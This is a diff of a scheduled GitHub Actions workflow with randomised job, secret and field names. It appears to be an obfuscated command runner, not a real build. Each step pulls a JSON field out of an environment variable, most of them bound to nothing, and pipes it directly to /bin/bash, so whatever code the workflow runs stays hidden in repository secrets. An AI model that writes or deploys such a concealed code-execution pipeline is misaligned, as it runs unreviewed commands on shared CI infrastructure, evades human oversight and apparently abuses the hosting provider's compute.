@@ -1,22 +1,25 @@
 name: hanturan4187
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 2/6 * * *'
-jobs:  # 5805
+    - cron: '13 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: hanturan4187
         env:
-          f84: ${{ secrets.f84 }}
+          eqf2379: ${{ secrets.eqf2379 }}
         run: |
-          echo $f84 | jq -r .q738 | /bin/bash
-          echo $by13471 | jq -r .wgx072 | /bin/bash
-          echo $ie65 | jq -r .jxhjp5435 | /bin/bash
-          echo $sp7 | jq -r .jbjt32 | /bin/bash
-          echo $dvkr37752 | jq -r .iu03 | /bin/bash
-          echo $wq3422 | jq -r .n88 | /bin/bash
+          echo $eqf2379 | jq -r .fa160 | /bin/bash
+          echo $ars818 | jq -r .yd184 | /bin/bash
+          echo $dqwe3286 | jq -r .qqc93318 | /bin/bash
+          echo $idmv85 | jq -r .ybynp4487 | /bin/bash
+          echo $b051 | jq -r .m0 | /bin/bash
+          echo $krfly46039 | jq -r .pyom652 | /bin/bash
+          echo $mcn6541 | jq -r .kurjm1 | /bin/bash
+          echo $c2636 | jq -r .nk6461 | /bin/bash
+          echo $mlj56 | jq -r .d29 | /bin/bash
+          echo $xfl0 | jq -r .z52645 | /bin/bash
 
